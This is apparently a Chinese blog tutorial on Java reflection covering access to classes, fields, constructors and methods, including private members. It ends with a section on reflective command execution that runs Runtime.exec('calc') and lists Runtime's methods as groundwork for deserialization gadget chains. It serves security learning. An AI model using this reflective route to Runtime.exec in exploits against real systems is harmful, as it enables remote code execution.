</blockquote>
<h2 id="反射-Class对象类获取"><a href="#反射-Class对象类获取" class="headerlink" title="反射-Class对象类获取"></a>反射-Class对象类获取</h2><p><img src="/img/xiaodi/image-20250520211132599.png" alt="image-20250520211132599"></p>
<p>1、创建一个User类，包含成员变量和成员方法，构造方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 成员变量</span></span><br><span class="line">    <span class="keyword">public</span> String name=<span class="string">&quot;xiaodi&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">private</span> String gender=<span class="string">&quot;man&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">String</span> <span class="variable">job</span> <span class="operator">=</span> <span class="string">&quot;sec&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;no para&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">User</span><span class="params">(String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name&quot;</span>+name);</span><br><span class="line">        System.out.println(<span class="string">&quot;age&quot;</span>+age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 成员方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">userinfo</span><span class="params">(String name,<span class="type">int</span> age,String gender,String job)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">        <span class="built_in">this</span>.gender=gender;</span><br><span class="line">        <span class="built_in">this</span>.job=job;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">users</span><span class="params">(String name,String gender)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.gender=gender;</span><br><span class="line">        System.out.println(<span class="string">&quot;users people method&quot;</span>+name);</span><br><span class="line">        System.out.println(<span class="string">&quot;users people method&quot;</span>+gender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>2、对象类名获取</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1、通过全限定类名：Class.forName(&quot;全路径类名&quot;)</span></span><br><span class="line">        Class aClass=Class.forName(<span class="string">&quot;org.example.User&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;class:&quot;</span>+aClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2、根据类名：类名.class</span></span><br><span class="line">        Class userClass= User.class;</span><br><span class="line">        System.out.println(<span class="string">&quot;class:&quot;</span>+userClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3、根据对象：对象.getClass()</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass1</span> <span class="operator">=</span> user.getClass();</span><br><span class="line">        System.out.println(<span class="string">&quot;class:&quot;</span>+aClass1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4、通过类加载器获得Class对象：//ClassLoader.getSystemClassLoader().loadClass(&quot;全路径类名&quot;);</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">clsloader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass2</span> <span class="operator">=</span> clsloader.loadClass(<span class="string">&quot;org.example.User&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;class:&quot;</span>+aClass2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>结果输出：</p>
<p><img src="/img/xiaodi/image-20250520211153860.png" alt="image-20250520211153860"></p>
<h2 id="反射-Field成员变量类获取"><a href="#反射-Field成员变量类获取" class="headerlink" title="反射-Field成员变量类获取"></a>反射-Field成员变量类获取</h2><p><img src="/img/xiaodi/87dab2f6cddd83f4bc29f15b7e3c2d79-1747746836710-9.png" alt="Untitled"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FieldDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取类名</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.example.User&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1、获取公共的成员变量：Field[] fields1 = aClass.getFields();</span></span><br><span class="line">        Field[] fileds1 = aClass.getFields();</span><br><span class="line">        <span class="comment">// 遍历获取公共成员变量</span></span><br><span class="line">        <span class="keyword">for</span> (Field field : fileds1) &#123;</span><br><span class="line">            System.out.println(field);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2、获取所有的成员变量：Field[] fields = aClass.getDeclaredFields();</span></span><br><span class="line">        Field[] fields = aClass.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            System.out.println(field);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3、获取单个的公共成员变量：Field name = aClass.getField(&quot;name&quot;);</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> aClass.getField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="comment">//Field name = aClass.getField(&quot;gender&quot;);  -------&gt;报错 非公共成员变量</span></span><br><span class="line">        System.out.println(name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4、获取单个的成员变量：Field gender = aClass.getDeclaredField(&quot;gender&quot;)</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">gender</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;gender&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/xiaodi/image-20250521083803280-1747787884878-1.png" alt="image-20250521083803280"></p>
<p>进行赋值和取值操作</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SetValueDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.example.User&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> aClass.getField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//取值</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">a</span> <span class="operator">=</span>name.get(user);</span><br><span class="line">        System.out.println(a);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//赋值</span></span><br><span class="line">        name.set(user,<span class="string">&quot;xiaosedisssssss&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">newUser</span> <span class="operator">=</span>name.get(user);</span><br><span class="line">        System.out.println(newUser);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="/img/xiaodi/image-20250521085644472.png" alt="image-20250521085644472"></p>
<h2 id="反射-Constructor构造方法类获取"><a href="#反射-Constructor构造方法类获取" class="headerlink" title="反射-Constructor构造方法类获取"></a>反射-Constructor构造方法类获取</h2><p><img src="https://i-blog.csdnimg.cn/blog_migrate/8cb1c813b193d8e925b10c2b080a9298.png" alt="Untitled"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GouzaoDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="comment">// 获取到类名</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.example.User&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1、获取公共的构造方法</span></span><br><span class="line">        Constructor[] constructors = aClass.getConstructors();</span><br><span class="line">        <span class="keyword">for</span> (Constructor constructor : constructors) &#123;</span><br><span class="line">            System.out.println(constructor);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2、获取所有的构造方法</span></span><br><span class="line">        Constructor[]  constructors1 = aClass.getDeclaredConstructors();</span><br><span class="line">        <span class="keyword">for</span> (Constructor constructor : constructors1) &#123;</span><br><span class="line">            System.out.println(constructor);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3、获取单个的构造方法</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructors2</span> <span class="operator">=</span> aClass.getDeclaredConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        System.out.println(constructors2);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对构造方法进行操作(两个参数string，int)，**<code>setAccessible(true)</code>临时开启对私有的访问，`newInstance&#96;** 使用构造方法创建对象，传递参数;</p>
<p><strong>newInstance 方法：</strong></p>
<ul>
<li>newInstance 方法是 java.lang.reflect.Constructor 类的一个方法，用于创建新的类实例。</li>
<li>它通过调用类的构造方法来实例化对象。</li>
<li>newInstance 方法通常用于动态创建对象，尤其是在反射时，允许在运行时通过 Constructor 对象调用类的构造方法。</li>
</ul>
<p><strong>setAccessible(true) 方法：</strong></p>
<ul>
<li>setAccessible 方法是 java.lang.reflect.AccessibleObject 类的一个方法，用于启用或禁用 Java 语言访问检查。</li>
<li>当 setAccessible(true) 被调用时，表示反射对象在使用时取消了访问权限检查，可以访问类的私有成员。</li>
<li>这通常用于访问那些受到访问控制限制的类的私有成员（字段、方法、构造方法等）。</li>
</ul>
<p>现在User.java新添加构造方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public User(String name)&#123;</span><br><span class="line">    System.out.println(&quot;name=&quot;+name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>实现代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GouzaoDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">// 获取到类名</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.example.User&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取单个的构造方法</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructors2</span> <span class="operator">=</span> aClass.getDeclaredConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对私有方法进行操作</span></span><br><span class="line">        constructors2.setAccessible(<span class="literal">true</span>); <span class="comment">//临时开启私有成员访问权限</span></span><br><span class="line">        User uu=(User) constructors2.newInstance(<span class="string">&quot;xiaodigay&quot;</span>,<span class="number">34</span>);</span><br><span class="line">        System.out.println(uu);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor3</span> <span class="operator">=</span> aClass.getConstructor(String.class);</span><br><span class="line">        System.out.println(constructor3);</span><br><span class="line">        constructor3.newInstance(<span class="string">&quot;woaixiaodi&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>结果截图</p>
<p><img src="/img/xiaodi/image-20250521092406334-1747790648234-3.png" alt="image-20250521092406334"></p>
<h2 id="反射-Method成员方法类获取"><a href="#反射-Method成员方法类获取" class="headerlink" title="反射-Method成员方法类获取"></a>反射-Method成员方法类获取</h2><p><img src="/img/xiaodi/53a3ff45af64226548a4e65689739c45-1747790953639-5.png" alt="Untitled"></p>
<p>实现方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GouzaoDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">// 获取到类名</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.example.User&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1、获取包括继承的公共成员方法</span></span><br><span class="line">        Method[] methods = aClass.getMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">            System.out.println(method);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;-------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2、获取不包括继承的所有成员方法</span></span><br><span class="line">        Method[] methods1 = aClass.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method method : methods1) &#123;</span><br><span class="line">            System.out.println(method);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;-------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3、获取单个的成员方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">users</span> <span class="operator">=</span> aClass.getDeclaredMethod(<span class="string">&quot;users&quot;</span>,String.class,String.class);</span><br><span class="line">        System.out.println(<span class="string">&quot;users:&quot;</span>+users);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>代码实现：</p>
<p><img src="/img/xiaodi/image-20250521094036895.png" alt="image-20250521094036895"></p>
<p><strong>对成员方法的执行</strong></p>
<ol>
<li><p>User u &#x3D; new User();: 创建一个 User 对象，即实例化 User 类。</p>
</li>
<li><p>Method users &#x3D; aClass.getDeclaredMethod(“users”, String.class, String.class);: 通过反射获取 User 类中名为 “users” 的方法，该方法接受两个参数，类型分别为 String 和 String。</p>
</li>
<li><p>users.invoke(u, “xiaodigay”, “gay1”);: 使用 invoke 方法调用 User 对象的 users 方法，传递参数 “xiaodigay” 和 “gay1”。这行代码相当于调用 u.users(“xiaodigay”, “gay1”)。</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GouzaoDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">// 获取到类名</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.example.User&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1、获取包括继承的公共成员方法</span></span><br><span class="line">        Method[] methods = aClass.getMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">            System.out.println(method);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;-------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2、获取不包括继承的所有成员方法</span></span><br><span class="line">        Method[] methods1 = aClass.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method method : methods1) &#123;</span><br><span class="line">            System.out.println(method);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;-------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3、获取单个的成员方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">users</span> <span class="operator">=</span> aClass.getDeclaredMethod(<span class="string">&quot;users&quot;</span>,String.class,String.class);</span><br><span class="line">        System.out.println(<span class="string">&quot;users:&quot;</span>+users);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4、对成员方法执行</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">users1</span> <span class="operator">=</span> aClass.getDeclaredMethod(<span class="string">&quot;users&quot;</span>,String.class,String.class);</span><br><span class="line">        users1.invoke(u,<span class="string">&quot;xiaodigay&quot;</span>,<span class="string">&quot;gay111&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="/img/xiaodi/image-20250521094722418.png" alt="image-20250521094722418"></p>
<h3 id="反射-不安全命令执行-反序列化链构造"><a href="#反射-不安全命令执行-反序列化链构造" class="headerlink" title="反射-不安全命令执行&amp;反序列化链构造"></a>反射-不安全命令执行&amp;反序列化链构造</h3><h4 id="1、反射实现-命令执行"><a href="#1、反射实现-命令执行" class="headerlink" title="1、反射实现-命令执行"></a>1、反射实现-命令执行</h4><p>原型：java自带包含有的java.lang中有对于本机控制台的调用方法<br>Runtime.getRuntime().exec(“calc”);</p>
<p><img src="/img/xiaodi/image-20250521095737811.png" alt="image-20250521095737811"></p>
<p>反射：如果是第三方的jar包如何实现</p>
<ul>
<li>首先使用 Class.forName获取 java.lang.Runtime 类</li>
<li>通过getMethods获取该类<strong>包括继承</strong>的<strong>公共成员</strong>方法，并遍历出来</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用 Class.forName 获取 java.lang.Runtime 类</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 Runtime 类的所有公共方法</span></span><br><span class="line">Method[] methods = aClass.getMethods();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历所有方法并打印输出方法信息</span></span><br><span class="line"><span class="keyword">for</span> (Method me : methods) &#123;</span><br><span class="line">    System.out.println(me);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>通过查询找到对应需要的成员方法</li>
<li>根据成员方法的名称和参数，分别对应获取所需成员方法</li>
<li>通过使用获取的方法依次调用执行即可</li>
<li><img src="/img/xiaodi/image-20250521102031266.png" alt="image-20250521102031266"></li>
</ul>
